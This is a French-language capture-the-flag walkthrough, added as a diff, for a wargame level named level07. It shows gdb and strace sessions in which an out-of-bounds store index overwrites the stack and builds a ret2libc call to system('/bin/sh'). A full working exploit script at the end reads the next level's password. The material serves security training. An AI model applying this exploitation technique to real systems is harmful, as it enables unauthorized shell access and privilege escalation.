@@ -1,0 +1,237 @@
+- Apres analyse du code asm, on remarque que l'ont peu
+ecrire partout sur la stack sauf si le modulo 3 de l'index est
+égal a 0
+- On remarque aussi que l'env et argv sont effacer.
+- Le but de l'exploit va etre de trouver un index qui va modifier
+esp pour ensuite modifier eip a une instruction ret
+- Ensuite on va faire faire un ret2libc sur system afin
+d'executer un shell
+
+1) On determine ou reécrire la stack.
+
+On va essayer de modifier esp pour que quand on
+quitte le prog notre shellcode soit executer.
+
+Pour se faire on essaie de réécrire a plusieur endroit
+avec la commande store du programme.
+
+On voit que l'index -11 modifie esp
+
+On va injecter 0x42424242 = 111163854
+
+touch /tmp/test10
+chmod 777 /tmp/test10
+nano /tmp/test10
+
+python -c 'print "store\n"'
+python -c 'print "1111638594\n"'
+python -c 'print "-11"'
+python -c 'print "quit\n"'
+
+gdb ./level07
+(gdb) r < <(/tmp/test10)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level07/level07 < <(/tmp/test10)
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080489ed in main ()
+(gdb) i r
+eax            0x0      0
+ecx            0xffffd600       -10752
+edx            0xffffd600       -10752
+ebx            0xffffd544       -10940
+esp            0x42424236       0x42424236
+ebp            0x42424242       0x42424242
+esi            0x0      0
+edi            0x8048d6a        134516074
+eip            0x80489ed        0x80489ed <main+714>
+eflags         0x10246  [ PF ZF IF RF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+
+
+2) On recherche l'adresse de l'index 2
+
+cp /tmp/test7 /tmp/test7bis
+chmod 777 /tmp/test7bis
+nano /tmp/test7bis
+
+python -c 'print "store\n"'
+python -c 'print "1337\n"'
+python -c 'print "2"'
+python -c 'print "quit\n"'
+
+gdb ./level7
+break *0x80486ce
+r < <(/tmp/test7bis)
+i r
+
+Breakpoint 1, 0x080486ce in store_number ()
+(gdb) i r
+eax            0xffffd54c       -10932
+ecx            0x2      2
+edx            0x539    1337
+ebx            0xffffd544       -10940
+esp            0xffffd4f0       0xffffd4f0
+ebp            0xffffd518       0xffffd518
+
+===> 0xffffd54c
+
+3) On recherche l'adresse de l'index 7
+
+cp /tmp/test7 /tmp/test7bis
+chmod 777 /tmp/test7bis
+nano /tmp/test7bis
+
+python -c 'print "store\n"'
+python -c 'print "1337\n"'
+python -c 'print "7"'
+python -c 'print "quit\n"'
+
+gdb ./level7
+break *0x80486ce
+r < <(/tmp/test7bis)
+i r
+
+(gdb) i r
+eax            0xffffd560       -10912
+ecx            0x7      7
+edx            0x539    1337
+ebx            0xffffd544       -10940
+esp            0xffffd4f0       0xffffd4f0
+ebp            0xffffd518       0xffffd518
+esi            0xffffd6dd       -10531
+
+===> 0xffffd560
+
+4) On recherche l'adresse de la fct system
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+5) On crée le ret2libc ou il faut mettre
+system + 4 bits useless + addr vers une string
+
+touch /tmp/test11
+chmod 777 /tmp/test11
+nano /tmp/test11
+
+python -c 'print "store\n"'
+python -c 'print "4159090384\n"'
+python -c 'print "2"'
+python -c 'print "store\n"'
+python -c 'print "4294956384\n"'
+python -c 'print "4"'
+python -c 'print "store\n"'
+python -c 'print "1852400175\n"'
+python -c 'print "7"'
+python -c 'print "store\n"'
+python -c 'print "6845231\n"'
+python -c 'print "8"'
+python -c 'print "store\n"'
+python -c 'print "4294956360\n"'
+python -c 'print "-11"'
+python -c 'print "quit\n"'
+python -c 'print "cat /home/users/level08/.pass"'
+
+Creation de la string "/bin/sh" :
+
+/bin ===> 0x2f62696e ====> reverse car endian ===> 0x6e69622f ===> 1852400175
+/sh ====> 0x2f736700 ====> reverse car endian ===> 0x0068732f ===> 6845231
+
+6) On remarque que ca marche avec gdb ou strace
+mais pas hors de ceux-ci
+
+read(0, "quit\n\n", 4096)               = 6
+rt_sigaction(SIGINT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
+rt_sigaction(SIGQUIT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
+rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xffffd530) = 9522
+waitpid(9522, unknown pid: 9503
+level07@OverRide:~$ cat: /home/users/level08/.pass: Permission denied
+
+7) Il faut avoir la meme position d'env que comme dans
+strace ou gdb
+
+touch /tmp/test7
+chmod 777 /tmp/test7
+nano /tmp/test7
+
+python -c 'print "read\n"'
+python -c 'print "-11"'
+python -c 'print "quit\n"'
+
+env -i /home/users/level07/level07 < <(/tmp/test7)
+
+
+Input command:  Index:  Number at data[4294967285] is 4294958680
+ Completed read command successfully
+
+strace /home/users/level07/level07 < <(/tmp/test7)
+
+write(1, " Number at data[4294967285] is 4"..., 42 Number at data[4294967285] is 4294956808
+) = 42
+
+Il y a une diff de 1872 entre les 2
+
+
+8) On resetup l'exploit et vérifie l'adresse
+
+strace env -i `python -c 'print "AAAA=" + "a" * (1872)'` /home/users/level07/level07 < <(/tmp/test7)
+
+write(1, " Number at data[4294967285] is 4"..., 42 Number at data[4294967285] is 4294956792
+) = 42
+
+===> pas encore le bon endroit
+
+9) Recheck
+
+strace env -i `python -c 'print "AAAA=" + "a" * (1872 - 10)'` /home/users/level07/level07 < <(/tmp/test7)
+
+write(1, " Number at data[4294967285] is 4"..., 42 Number at data[4294967285] is 4294956808
+) = 42
+
+====> Meme chose avec l'env -i strace et strace !
+
+- Exploit :
+
+touch /tmp/test8
+chmod 777 /tmp/test8
+nano /tmp/test8
+
+python -c 'print "store\n"'
+python -c 'print "4159090384\n"'
+python -c 'print "2"'
+python -c 'print "store\n"'
+python -c 'print "4294956384\n"'
+python -c 'print "4"'
+python -c 'print "store\n"'
+python -c 'print "1852400175\n"'
+python -c 'print "7"'
+python -c 'print "store\n"'
+python -c 'print "6845231\n"'
+python -c 'print "8"'
+python -c 'print "store\n"'
+python -c 'print "4294956360\n"'
+python -c 'print "-11"'
+python -c 'print "quit\n"'
+python -c 'print "cat /home/users/level08/.pass; whoami"'
+
+env -i `python -c 'print "AAAA=" + "a" * (1872 - 10)'` /home/users/level07/level07 < <(/tmp/test8)
